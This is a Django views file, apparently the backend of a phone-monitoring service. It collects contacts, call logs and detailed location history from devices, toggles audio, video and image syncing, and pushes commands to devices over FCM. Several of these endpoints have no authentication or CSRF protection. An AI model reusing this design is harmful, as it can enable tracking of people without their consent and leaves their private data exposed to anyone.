            for (dev_key, phone), agg in contact_call_agg.items():
                idx = node_map[phone]
                nodes[idx]["calls"] += agg["count"]
                nodes[idx]["duration"] += agg["duration"]
                dd_list = nodes[idx].get("device_details", [])
                for dd in dd_list:
                    if dd["device_key"] == dev_key:
                        dd["calls"] = agg["count"]
                        dd["duration"] = agg["duration"]
                        dd["call_types"] = agg["types"]
                        dd["first_call"] = agg["first_call"].strftime("%d %b %Y, %I:%M %p") if agg["first_call"] else None
                        dd["last_call"] = agg["last_call"].strftime("%d %b %Y, %I:%M %p") if agg["last_call"] else None
                        break

            # Build links with call data
            for phone, dev_keys_set in phone_to_devices.items():
                for dk in dev_keys_set:
                    pair = (dk, phone)
                    agg = contact_call_agg.get(pair)
                    links.append({
                        "source": dk,
                        "target": phone,
                        "calls": agg["count"] if agg else 0,
                        "duration": agg["duration"] if agg else 0,
                        "types": list(agg["types"].keys()) if agg else [],
                        "link_type": "contact",
                    })

    # ==================== CALL LOGS MODE ====================
    call_agg = {}
    if mode in ('calllogs', 'all'):
        for dev in devices:
            dev_key = f"device_{dev.id}"
            dev_label = device_labels.get(dev_key, dev_key)
            call_qs = CallLog.objects.filter(device=dev)
            if date_from:
                call_qs = call_qs.filter(timestamp__date__gte=date_from)
            if date_to:
                call_qs = call_qs.filter(timestamp__date__lte=date_to)
            for log in call_qs:
                raw_phone = log.phone_number
                phone = normalize_phone(raw_phone)
                if not phone:
                    continue
                pair = (dev_key, phone)
                if pair not in call_agg:
                    call_agg[pair] = {"count": 0, "duration": 0, "types": {}, "first_call": None, "last_call": None}
                call_agg[pair]["count"] += 1
                call_agg[pair]["duration"] += log.duration_seconds or 0
                ct = log.call_type or "unknown"
                call_agg[pair]["types"][ct] = call_agg[pair]["types"].get(ct, 0) + 1
                ts = log.timestamp
                if ts:
                    if call_agg[pair]["first_call"] is None or ts < call_agg[pair]["first_call"]:
                        call_agg[pair]["first_call"] = ts
                    if call_agg[pair]["last_call"] is None or ts > call_agg[pair]["last_call"]:
                        call_agg[pair]["last_call"] = ts

                if phone not in node_map:
                    node_map[phone] = len(nodes)
                    nodes.append({
                        "id": phone,
                        "label": log.name or phone,
                        "group": "call_only",
                        "color": "#f5576c",
                        "calls": 0,
                        "duration": 0,
                        "devices": [dev_label],
                        "email": "",
                        "original_phones": [raw_phone],
                        "device_details": [{
                            "device": dev_label,
                            "device_key": dev_key,
                            "name": log.name or "",
                            "phone_stored": raw_phone,
                            "email": "",
                            "calls": 0,
                            "duration": 0,
                            "call_types": {},
                            "first_call": None,
                            "last_call": None,
                        }],
                    })
                else:
                    existing = nodes[node_map[phone]]
                    if dev_label not in existing.get("devices", []):
                        existing.setdefault("devices", []).append(dev_label)
                    if raw_phone not in existing.get("original_phones", []):
                        existing.setdefault("original_phones", []).append(raw_phone)
                    dd_list = existing.setdefault("device_details", [])
                    found = False
                    for dd in dd_list:
                        if dd["device_key"] == dev_key:
                            found = True
                            break
                    if not found:
                        dd_list.append({
                            "device": dev_label,
                            "device_key": dev_key,
                            "name": log.name or "",
                            "phone_stored": raw_phone,
                            "email": "",
                            "calls": 0,
                            "duration": 0,
                            "call_types": {},
                            "first_call": None,
                            "last_call": None,
                        })

                if phone not in phone_to_devices:
                    phone_to_devices[phone] = set()
                phone_to_devices[phone].add(dev_key)

        # Build call links & update per-device call stats
        for (dev_key, phone), agg in call_agg.items():
            idx = node_map[phone]
            nodes[idx]["calls"] += agg["count"]
            nodes[idx]["duration"] += agg["duration"]
            if mode == 'all' and nodes[idx]["group"] == "contact":
                nodes[idx]["group"] = "contact_with_calls"
                nodes[idx]["color"] = "#38ef7d"

            # Update device_details with call stats
            dd_list = nodes[idx].get("device_details", [])
            for dd in dd_list:
                if dd["device_key"] == dev_key:
                    dd["calls"] = agg["count"]
                    dd["duration"] = agg["duration"]
                    dd["call_types"] = agg["types"]
                    dd["first_call"] = agg["first_call"].strftime("%d %b %Y, %I:%M %p") if agg["first_call"] else None
                    dd["last_call"] = agg["last_call"].strftime("%d %b %Y, %I:%M %p") if agg["last_call"] else None
                    break

            links.append({
                "source": dev_key,
                "target": phone,
                "calls": agg["count"],
                "duration": agg["duration"],
                "types": list(agg["types"].keys()),
                "link_type": "call",
            })

    # ==================== ALL MODE: contact-only links ====================
    if mode == 'all':
        for phone, dev_keys_set in phone_to_devices.items():
            for dk in dev_keys_set:
                pair = (dk, phone)
                if pair not in call_agg:
                    links.append({
                        "source": dk,
                        "target": phone,
                        "calls": 0,
                        "duration": 0,
                        "types": [],
                        "link_type": "contact",
                    })

    # ==================== BRIDGE LINKS ====================
    bridge_links = []
    dev_keys_list = [f"device_{d.id}" for d in devices]
    for phone, dev_keys_set in phone_to_devices.items():
        dev_list = [dk for dk in dev_keys_set if dk in dev_keys_list]
        if len(dev_list) >= 2:
            for i_idx in range(len(dev_list)):
                for j_idx in range(i_idx + 1, len(dev_list)):
                    bridge_links.append({
                        "source": dev_list[i_idx],
                        "target": dev_list[j_idx],
                        "calls": 0,
                        "duration": 0,
                        "types": [],
                        "link_type": "bridge",
                        "shared_phone": phone,
                        "shared_name": nodes[node_map[phone]]["label"],
                    })

    bridge_agg = {}
    for bl in bridge_links:
        pair_key = tuple(sorted([bl["source"], bl["target"]]))
        if pair_key not in bridge_agg:
            bridge_agg[pair_key] = {"source": pair_key[0], "target": pair_key[1], "shared": [], "shared_phones": [], "link_type": "bridge", "calls": 0, "duration": 0, "types": []}
        bridge_agg[pair_key]["shared"].append(bl["shared_name"])
        bridge_agg[pair_key]["shared_phones"].append(bl["shared_phone"])

    links.extend(bridge_agg.values())

    return JsonResponse({"nodes": nodes, "links": links, "bridges": list(bridge_agg.values()), "device_labels": device_labels, "mode": mode})

@csrf_exempt
def audit_errors(request):
    if request.method != 'POST':
        return JsonResponse({"success": False, "message": "POST required"}, status=405)
    try:
        data = json.loads(request.body)
    except json.JSONDecodeError:
        return JsonResponse({"success": False, "message": "Invalid JSON"}, status=400)

    error_id = data.get('error_id')
    if not error_id:
        return JsonResponse({"success": False, "message": "error_id required"}, status=400)

    ctx = data.get('context', {})
    err = data.get('error', {})
    ts_raw = data.get('timestamp')
    ts = None
    if ts_raw:
        from django.utils.dateparse import parse_datetime
        ts = parse_datetime(ts_raw)
        if not ts:
            ts = now()
    else:
        ts = now()

    obj, created = AuditError.objects.update_or_create(
        error_id=error_id,
        defaults={
            'timestamp': ts,
            'source': ctx.get('source'),
            'event_type': ctx.get('event_type'),
            'user_id': ctx.get('user_id'),
            'device_id': ctx.get('device_id'),
            'api_url': ctx.get('api_url'),
            'app_version': ctx.get('app_version'),
            'platform': ctx.get('platform'),
            'os_version': str(ctx.get('os_version', '')) or None,
            'task_elapsed_seconds': ctx.get('task_elapsed_seconds'),
            'error_type': err.get('type'),
            'error_message': err.get('message'),
            'http_status': err.get('http_status'),
            'http_status_text': err.get('http_status_text'),
            'response_snippet': err.get('response_snippet'),
            'stack': err.get('stack'),
            'payload_summary': data.get('payload_summary'),
            'payload_preview': data.get('payload_preview'),
        }
    )

    return JsonResponse({
        "success": True,
        "error_id": obj.error_id,
        "action": "CREATED" if created else "UPDATED"
    })

def audit_errors_list(request):
    errors = AuditError.objects.all()
    errors_json = json.dumps([
        {
            'error_id': e.error_id,
            'timestamp': e.timestamp.isoformat() if e.timestamp else None,
            'source': e.source,
            'event_type': e.event_type,
            'user_id': e.user_id,
            'device_id': e.device_id,
            'api_url': e.api_url,
            'app_version': e.app_version,
            'platform': e.platform,
            'os_version': e.os_version,
            'task_elapsed_seconds': e.task_elapsed_seconds,
            'error_type': e.error_type,
            'error_message': e.error_message,
            'http_status': e.http_status,
            'http_status_text': e.http_status_text,
            'response_snippet': e.response_snippet,
            'stack': e.stack,
            'payload_summary': e.payload_summary,
            'payload_preview': e.payload_preview,
            'created_at': e.created_at.isoformat() if e.created_at else None,
        } for e in errors
    ])
    return render(request, 'device_access/audit_errors.html', {
        'errors': errors,
        'errors_json': errors_json,
    })

def audit_errors_clear(request):
    if request.method != 'POST':
        return JsonResponse({"success": False, "message": "POST required"}, status=405)
    count, _ = AuditError.objects.all().delete()
    return JsonResponse({"success": True, "deleted": count})

def device_view(request, id):       
    context = {}
    device = Device.objects.filter(id=id).first()
    if device:
        context['device'] = device
        context['device_infos'] = DeviceInfo.objects.filter(device=device)
        context['network_infos'] = NetworkInfo.objects.filter(device=device)
        context['sim_cards'] = SIMCard.objects.filter(device=device)
        context['system_infos'] = SystemInfo.objects.filter(device=device)
        context['contact_count'] = Contact.objects.filter(device=device).count()
        context['location_count'] = Location.objects.filter(device=device).count()
        context['call_log_count'] = CallLog.objects.filter(device=device).count()
    return render(request, 'device_access/device_view.html', context)


def device_view_data_api(request, id):
    device = Device.objects.filter(id=id).first()
    if not device:
        return JsonResponse({'data': []})

    data_type = request.GET.get('type', '')

    if data_type == 'contacts':
        qs = Contact.objects.filter(device=device)
        rows = []
        for c in qs:
            rows.append([
                c.name or '-',
                c.phone_number or '-',
                c.email or '-',
                c.synced_at.strftime('%d %b %Y, %I:%M %p') if c.synced_at else '-',
            ])
        return JsonResponse({'data': rows})

    elif data_type == 'calllogs':
        qs = CallLog.objects.filter(device=device).order_by('-timestamp')
        rows = []
        for log in qs:
            rows.append([
                log.name or '-',
                log.phone_number or '-',
                log.call_type or '-',
                log.timestamp.strftime('%d %b %Y, %I:%M %p') if log.timestamp else '-',
                log.duration_seconds or 0,
            ])
        return JsonResponse({'data': rows})

    elif data_type == 'locations':
        qs = Location.objects.filter(device=device).order_by('-timestamp')
        rows = []
        for loc in qs:
            rows.append([
                str(loc.latitude), str(loc.longitude),
                str(loc.altitude or ''), str(loc.accuracy or ''),
                str(loc.heading or ''), str(loc.speed or ''),
                loc.timestamp.strftime('%d %b %Y, %I:%M %p') if loc.timestamp else '-',
                str(loc.is_gps), str(loc.is_approximate or ''),
                loc.method or '-', loc.city or '-', loc.region or '-',
                loc.country or '-', loc.isp or '-', loc.ip or '-',
                loc.timezone or '-', loc.postal_code or '-',
            ])
        return JsonResponse({'data': rows})

    elif data_type == 'map':
        qs = Location.objects.filter(device=device).order_by('-timestamp').values('latitude', 'longitude')
        rows = [{'latitude': float(r['latitude']), 'longitude': float(r['longitude'])} for r in qs]
        return JsonResponse({'data': rows})

    return JsonResponse({'data': []})


def device_delete(request, id):
    device = Device.objects.filter(id=id).first()
    if device:
        device.delete()
    return redirect('device_list')

@csrf_exempt
def device_media_toggle_api(request):
    if request.method != 'POST':
        return JsonResponse({"success": False, "message": "POST required"}, status=405)
    data = json.loads(request.body)
    device_id = data.get('id')
    audio = data.get('audio')
    video = data.get('video')
    image = data.get('image')
    disabled = data.get('disabled', False)
    device = Device.objects.filter(id=device_id).first()
    if device:
        device.sync_audio = audio
        device.sync_video = video
        device.sync_image = image
        device.sync_disabled = disabled
        device.save()
        return JsonResponse({"success": True, "audio": device.sync_audio, "video": device.sync_video, "image": device.sync_image, "disabled": device.sync_disabled})
    return JsonResponse({"success": False, "message": "Device not found"}, status=404)


# ==================== REMINDERS API ====================
def reminders_api(request):
    if request.method != 'GET':
        return JsonResponse({"success": False, "message": "GET required"}, status=405)

    user_id = request.GET.get('user_id')
    device_id = request.GET.get('device_id')

    if not user_id or not device_id:
        return JsonResponse({"success": False, "message": "user_id and device_id required"}, status=400)

    device = Device.objects.filter(user_id=user_id, device_id=device_id).first()
    if not device:
        return JsonResponse({"reminders": []})

    reminders = Reminder.objects.filter(device=device, enabled=True)
    data = []
    for r in reminders:
        item = {
            "id": f"rem_{r.id:03d}",
            "title": r.title,
            "body": r.body,
            "type": r.type,
            "enabled": r.enabled,
            "sound": r.sound,
        }
        if r.type in ('daily', 'weekly'):
            item["hour"] = r.hour
            item["minute"] = r.minute
        if r.type == 'weekly':
            item["weekday"] = r.weekday
        if r.type == 'interval':
            item["seconds"] = r.seconds
        if r.type == 'once' and r.date:
            item["date"] = r.date.isoformat()
        data.append(item)

    return JsonResponse({"reminders": data})


# ==================== REMINDER CRUD VIEWS ====================
@login_required
def reminders(request):
    device_id = request.GET.get('device_id')
    qs = Reminder.objects.select_related('device').all()
    selected_device_id = None
    if device_id:
        selected_device_id = int(device_id)
        qs = qs.filter(device_id=selected_device_id)
    return render(request, 'device_access/reminders.html', {
        'reminders': qs,
        'devices': Device.objects.filter(is_active=True),
        'selected_device_id': selected_device_id,
    })

@login_required
def reminder_add(request):
    if request.method == 'POST':
        form = ReminderForm(request.POST)
        if form.is_valid():
            form.save()
            messages.success(request, 'Reminder added successfully.')
            return redirect('reminders')
        else:
            messages.error(request, form.errors.as_text())
    else:
        form = ReminderForm()
    return render(request, 'device_access/reminder_edit.html', {'form': form})

@login_required
def reminder_edit(request, reminder_id):
    reminder = get_object_or_404(Reminder, id=reminder_id)
    if request.method == 'POST':
        form = ReminderForm(request.POST, instance=reminder)
        if form.is_valid():
            form.save()
            messages.success(request, 'Reminder updated successfully.')
            return redirect('reminders')
        else:
            messages.error(request, form.errors.as_text())
    else:
        form = ReminderForm(instance=reminder)
    return render(request, 'device_access/reminder_edit.html', {
        'form': form, 'reminder': reminder, 'is_edit': True
    })

@login_required
def reminder_delete(request, reminder_id):
    reminder = get_object_or_404(Reminder, id=reminder_id)
    device = reminder.device
    reminder.delete()
    # Push cancel to device
    _push_reminder_to_device(device.push_token, {
        'type': 'reminder_sync',
        'action': 'cancel',
        'reminder_id': f'rem_{reminder_id:03d}',
    })
    messages.success(request, 'Reminder deleted and cancel pushed to device.')
    return redirect('reminders')


# ==================== REMINDER FCM PUSH ====================
def _build_reminder_payload(reminder):
    """Build the reminder JSON object for FCM data payload."""
    item = {
        'id': f'rem_{reminder.id:03d}',
        'title': reminder.title,
        'body': reminder.body,
        'type': reminder.type,
        'enabled': reminder.enabled,
        'sound': reminder.sound,
    }
    if reminder.type in ('daily', 'weekly'):
        item['hour'] = reminder.hour
        item['minute'] = reminder.minute
    if reminder.type == 'weekly':
        item['weekday'] = reminder.weekday
    if reminder.type == 'interval':
        item['seconds'] = reminder.seconds
    if reminder.type == 'once' and reminder.date:
        item['date'] = reminder.date.isoformat()
    return item


def _push_reminder_to_device(push_token, data_payload):
    """Send a data-only FCM message to a single device."""
    access_token = get_fcm_token()
    if not access_token:
        return False
    url = f'https://fcm.googleapis.com/v1/projects/{FIREBASE_PROJECT_ID}/messages:send'
    # All values in data must be strings
    str_data = {k: str(v) if not isinstance(v, str) else v for k, v in data_payload.items()}
    payload = {
        'message': {
            'token': push_token,
            'data': str_data,
        }
    }
    try:
        resp = requests.post(url, headers={
            'Authorization': f'Bearer {access_token}',
            'Content-Type': 'application/json',
        }, json=payload)
        return resp.status_code == 200
    except Exception:
        return False


@csrf_exempt
def reminder_push(request):
    """Push reminder commands to devices via FCM data-only messages."""
    if request.method != 'POST':
        return JsonResponse({'success': False, 'message': 'POST required'}, status=405)
    try:
        data = json.loads(request.body)
    except json.JSONDecodeError:
        return JsonResponse({'success': False, 'message': 'Invalid JSON'}, status=400)

    action = data.get('action')
    reminder_id = data.get('reminder_id', 0)
    sent, failed = 0, 0

    if action == 'set' and reminder_id:
        # Push a single reminder to its device
        reminder = Reminder.objects.select_related('device').filter(id=reminder_id).first()
        if not reminder:
            return JsonResponse({'success': False, 'message': 'Reminder not found'}, status=404)
        payload = {
            'type': 'reminder_sync',
            'action': 'set',
            'reminder': json.dumps(_build_reminder_payload(reminder)),
        }
        ok = _push_reminder_to_device(reminder.device.push_token, payload)
        sent, failed = (1, 0) if ok else (0, 1)

    elif action == 'cancel' and reminder_id:
        # Cancel a single reminder on its device
        reminder = Reminder.objects.select_related('device').filter(id=reminder_id).first()
        if not reminder:
            return JsonResponse({'success': False, 'message': 'Reminder not found'}, status=404)
        payload = {
            'type': 'reminder_sync',
            'action': 'cancel',
            'reminder_id': f'rem_{reminder.id:03d}',
        }
        ok = _push_reminder_to_device(reminder.device.push_token, payload)
        sent, failed = (1, 0) if ok else (0, 1)

    elif action == 'sync_all':
        # Push all enabled reminders grouped by device
        devices = Device.objects.filter(is_active=True, reminders__enabled=True).distinct()
        for device in devices:
            device_reminders = Reminder.objects.filter(device=device, enabled=True)
            reminders_list = [_build_reminder_payload(r) for r in device_reminders]
            payload = {
                'type': 'reminder_sync',
                'action': 'sync_all',
                'reminders': json.dumps(reminders_list),
            }
            ok = _push_reminder_to_device(device.push_token, payload)
            if ok:
                sent += 1
            else:
                failed += 1

    elif action == 'cancel_all':
        # Cancel all reminders on all active devices
        devices = Device.objects.filter(is_active=True)
        for device in devices:
            payload = {
                'type': 'reminder_sync',
                'action': 'cancel_all',
            }
            ok = _push_reminder_to_device(device.push_token, payload)
            if ok:
                sent += 1
            else:
                failed += 1

    elif action == 'refresh':
        # Tell all active devices to re-fetch reminders from the API
        devices = Device.objects.filter(is_active=True)
        for device in devices:
            payload = {
                'type': 'reminder_sync',
                'action': 'refresh',
            }
            ok = _push_reminder_to_device(device.push_token, payload)
            if ok:
                sent += 1
            else:
                failed += 1

    else:
        return JsonResponse({'success': False, 'message': 'Invalid action'}, status=400)

    return JsonResponse({'success': True, 'sent': sent, 'failed': failed})